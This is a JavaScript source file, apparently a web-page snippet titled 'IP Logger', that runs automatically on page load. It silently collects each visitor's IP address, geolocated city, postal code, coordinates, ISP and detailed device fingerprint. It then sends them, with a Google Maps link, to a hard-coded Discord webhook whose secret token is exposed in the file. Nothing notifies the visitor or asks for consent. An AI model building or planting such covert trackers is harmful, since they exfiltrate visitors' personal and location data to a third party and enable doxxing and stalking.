// ===== CONFIGURATION =====
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1434694079274418317/DGX33BNtI3UNJYl0iEb1t2QfQd8lky4YN2-Lg0hnpL8XNBcXk3YKch-ZoMEmNUyke-XR';
const COOLDOWN_MINUTES = 5;
// =========================

function isOnCooldown(ip) {
    const cooldownKey = `ip_cooldown_${ip}`;
    const lastLogged = localStorage.getItem(cooldownKey);
    
    if (!lastLogged) {
        return false;
    }
    
    const lastLoggedTime = new Date(lastLogged);
    const now = new Date();
    const minutesPassed = (now - lastLoggedTime) / 1000 / 60;
    
    return minutesPassed < COOLDOWN_MINUTES;
}

function setCooldown(ip) {
    const cooldownKey = `ip_cooldown_${ip}`;
    localStorage.setItem(cooldownKey, new Date().toISOString());
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown';
    }
}

async function getIPDetails(ip) {
    try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching IP details:', error);
        return {};
    }
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    
    let browser = 'Unknown';
    if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
    else if (ua.indexOf('Trident') > -1) browser = 'Internet Explorer';
    else if (ua.indexOf('Edge') > -1) browser = 'Edge';
    else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
    else if (ua.indexOf('Safari') > -1) browser = 'Safari';

    let os = 'Unknown';
    if (ua.indexOf('Win') > -1) os = 'Windows';
    else if (ua.indexOf('Mac') > -1) os = 'MacOS';
    else if (ua.indexOf('Linux') > -1) os = 'Linux';
    else if (ua.indexOf('Android') > -1) os = 'Android';
    else if (ua.indexOf('iOS') > -1) os = 'iOS';

    let deviceType = 'Desktop';
    if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
        deviceType = /iPad|Tablet/i.test(ua) ? 'Tablet' : 'Mobile';
    }

    return {
        browser: browser,
        os: os,
        deviceType: deviceType,
        screenResolution: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        language: navigator.language,
        platform: navigator.platform,
        cookiesEnabled: navigator.cookieEnabled,
        userAgent: ua
    };
}

async function sendToDiscord(info) {
    const latitude = info.latitude || 'Unknown';
    const longitude = info.longitude || 'Unknown';
    const googleMapsLink = (latitude !== 'Unknown' && longitude !== 'Unknown') 
        ? `https://www.google.com/maps?q=${latitude},${longitude}` 
        : 'N/A';

    const embed = {
        title: '🔔 New Visitor Logged',
        color: 5814783,
        fields: [
            {
                name: '🌐 IP Address',
                value: info.ip || 'Unknown',
                inline: true
            },
            {
                name: '📍 Location',
                value: `${info.city || 'Unknown'}, ${info.region || ''} ${info.country_name || 'Unknown'}`,
                inline: true
            },
            {
                name: '🏠 Full Address',
                value: `${info.city || ''}, ${info.region || ''}, ${info.postal || ''}\n${info.country_name || 'Unknown'}`,
                inline: false
            },
            {
                name: '📌 Coordinates',
                value: `Lat: ${latitude}, Lon: ${longitude}`,
                inline: true
            },
            {
                name: '🗺️ Map Link',
                value: googleMapsLink !== 'N/A' ? `[View on Google Maps](${googleMapsLink})` : 'N/A',
                inline: true
            },
            {
                name: '🏢 ISP',
                value: info.org || 'Unknown',
                inline: false
            },
            {
                name: '💻 Browser',
                value: info.browser || 'Unknown',
                inline: true
            },
            {
                name: '⚙️ Operating System',
                value: info.os || 'Unknown',
                inline: true
            },
            {
                name: '📱 Device Type',
                value: info.deviceType || 'Unknown',
                inline: true
            },
            {
                name: '🖥️ Screen Resolution',
                value: info.screenResolution || 'Unknown',
                inline: true
            },
            {
                name: '📐 Viewport',
                value: info.viewport || 'Unknown',
                inline: true
            },
            {
                name: '🌍 Language',
                value: info.language || 'Unknown',
                inline: true
            },
            {
                name: '🕐 Timezone',
                value: info.timezone || 'Unknown',
                inline: true
            },
            {
                name: '🍪 Cookies',
                value: info.cookiesEnabled ? 'Enabled' : 'Disabled',
                inline: true
            },
            {
                name: '📋 User Agent',
                value: '```' + (info.userAgent || 'Unknown').substring(0, 1000) + '```',
                inline: false
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: 'IP Logger'
        }
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });

        if (response.ok) {
            console.log('Successfully logged to Discord');
        } else {
            console.error('Failed to send to Discord:', response.status);
        }
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

async function logVisitor() {
    try {
        const ip = await getIPAddress();
        
        // Check if IP is on cooldown
        if (isOnCooldown(ip)) {
            console.log(`IP ${ip} is on cooldown. Skipping log.`);
            return;
        }

        const ipDetails = await getIPDetails(ip);
        const deviceInfo = getDeviceInfo();

        const fullInfo = {
            ip: ip,
            ...ipDetails,
            ...deviceInfo,
            timestamp: new Date().toISOString(),
            pageUrl: window.location.href,
            referrer: document.referrer || 'Direct'
        };

        console.log('Visitor Info:', fullInfo);
        await sendToDiscord(fullInfo);
        
        // Set cooldown after successful log
        setCooldown(ip);

    } catch (error) {
        console.error('Error logging visitor:', error);
    }
}

// Run logger when page loads
logVisitor();
